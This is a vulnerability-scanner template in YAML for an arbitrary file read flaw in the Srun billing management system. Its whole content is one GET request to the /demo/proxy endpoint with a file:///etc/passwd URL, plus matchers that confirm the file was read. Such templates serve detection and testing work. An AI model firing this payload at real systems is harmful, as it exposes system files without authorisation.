id: poc-yaml-srun-proxy-anyfile-read

info:
  name: 深澜计费管理系统 proxy 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read

http:
  - method: GET
    path:
      - "{{BaseURL}}/demo/proxy?url=file:///etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:"
          - "/bin"
          - "<response>"
      - type: word
        part: header
        words:
          - "application/xml"
